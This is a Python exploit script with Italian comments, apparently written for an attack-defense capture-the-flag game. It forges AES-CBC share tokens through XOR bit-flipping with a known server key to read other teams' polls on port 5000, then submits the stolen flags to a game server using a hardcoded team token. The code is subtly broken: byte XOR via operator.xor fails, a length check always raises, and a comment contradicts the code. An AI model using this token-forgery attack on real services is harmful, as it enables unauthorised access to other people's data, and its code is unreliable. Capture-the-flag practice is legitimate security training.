from operator import xor
import os
import requests
import json
import random
import string
import re
from Crypto.Cipher import AES




# Specifico il mio indirizzo IP e quello del dispositivo NOP, che saranno poi esclusi dall'attacco
my_ip = '11.0.1.1'
nop_ip = '11.0.0.1'
header = {"X-Team-Token": "9b8fec624b7ea21a"}
# Ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")

# Otteniamo i dati degli avversari
opponents = requests.get("http://11.11.0.1:8080/api/client/attack_data").text
opponents = json.loads(opponents)
# Prelevo le informazioni riguardo il servizio che mi interessa
opponents = opponents['Polls']
opponents.pop(my_ip)
opponents.pop(nop_ip)

# Chiave segreta del server: in questo caso la chiave la conosciamo a priori in quanto fornita da noi nel codice; per
# rendere il codice più complesso dovremmo ricavare la key dinamicamente
server_key = b"16_r4ndom_bytes!"  



def create_token(poll_id, server_key):
    # Creo un oggetto cifrario sfruttando la conoscenza della server_key e la modalità CBC
    cipher = AES.new(server_key, AES.MODE_CBC)
    # Dopo aver convertito l'id da stringa a bytes e aver effettuato il padding aggiungendo spazi 
    # finchè non si arriva a 16 byte, possiamo cifrare il messaggio
    token = cipher.encrypt(poll_id.encode().ljust(16))
    # L'IV deve essere concatenato al messaggio cifrato; si aggiunge l'IV perche sarà necessario per decifrare il messaggio
    token = cipher.iv + token

    return token




# Funzione per la manipolazione del token tramite XOR
def manipulate_token(base_token, my_poll_id, poll_id):
    """
    Manipola il token tramite XOR come nell'exploit originale.
    """
    # La manipolazione avviene con una doppia XOR:
    # 1. XOR tra il base_token e my_poll_id (i primi 32 byte del base_token)
    # 2. XOR tra il risultato della prima XOR e poll_id
    base_token_bytes = base_token[:16]  # I primi 16 byte dell'IV e del messaggio cifrato
    manipulated_token = xor(xor(base_token_bytes, my_poll_id.encode()), poll_id.encode())
    
    return manipulated_token




def submit_flags(payload):
    url = "http://11.11.0.1:8080/flags"
    print(requests.put(url, headers = header, json = payload).text)




def exploit():
    for ip, poll_ids in opponents.items():
        try:
            payload = []
            # Generazione casuale per ottenere le credenziali di un utente fittizio
            username_length = random.randint(5, 64)
            password_length = random.randint(5, 64)

            username = ''.join(random.choices(string.digits, k = username_length))
            password = ''.join(random.choices(string.digits, k = password_length))

            user = {
                "username": username,
                "password": password
            }

            # Creiamo una sessione per l'utente
            s = requests.Session()

            # Registrazione e login 
            s.post(f"http://{ip}:5000/register", data = user)
            s.post(f"http://{ip}:5000/login", data = user)


            # Creiamo un sondaggio fittizio, che ci servirà da "base" per la manipolazione del token
            my_poll_id = os.urandom(8).hex()
            poll_data = {
                "id": my_poll_id,
                "owner": user, # viene memorizzato l'intero oggetto user
                "description": "Sondaggio test",
                "options": ["Opzione_1", "Opzione_2"],
                "votes": [0] * 2,
                "access": [[user, 0]], # vettore di liste in cui viene memorizzato l'oggetto utente (con tutti i suoi "attributi" e lo stato, 0/1)
                "expiration_date" : None
            }

            # Invio dei dati per creare il sondaggio
            response = s.post(f"http://{ip}:5000/create_poll", json = poll_data)
            
            # Generiamo il token di condivisione
            base_token = create_token(my_poll_id, server_key)

            # Manipoliamo il token per ciascun poll_id
            for poll_id in poll_ids:
                # Manipoliamo il token con il poll_id specifico
                manipulated_token = manipulate_token(base_token, my_poll_id, poll_id)

                # Verifica della validità del token manipolato (aggiungi una protezione se necessario)
                if len(manipulated_token) != len(base_token):
                    raise Exception(f"Token manipolato non ha la lunghezza corretta!")

                # Usare il token manipolato per accedere al sondaggio
                # Accesso al sondaggio tramite token
                response = s.post(f"http://{ip}:5000/access_poll", data = {"token": manipulated_token.hex()})
                if response.status_code == 200:
                    payload.append(response.text)

            # Invio delle flag trovate
            submit_flags(payload)


        except Exception as e:
            print(f"Errore durante l'attacco contro {ip}: {e}")